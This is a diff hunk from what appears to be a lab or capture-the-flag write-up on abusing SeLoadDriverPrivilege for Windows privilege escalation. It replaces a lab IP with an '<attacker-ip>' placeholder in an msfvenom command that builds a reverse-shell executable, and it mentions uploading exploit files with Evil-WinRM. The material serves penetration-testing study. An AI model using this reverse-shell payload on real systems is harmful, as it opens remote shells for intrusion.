@@ -210,7 +210,7 @@ User `svc-print` has `SeLoadDriverPrivilege` enabled. The `SeLoadDriverPrivilege
 Generate Reverse Shell Payload:
 
 ```
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.29 LPORT=4444 -f exe -o rev.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f exe -o rev.exe
 ```
 
 Upload Exploit Files with Evil-WinRM:
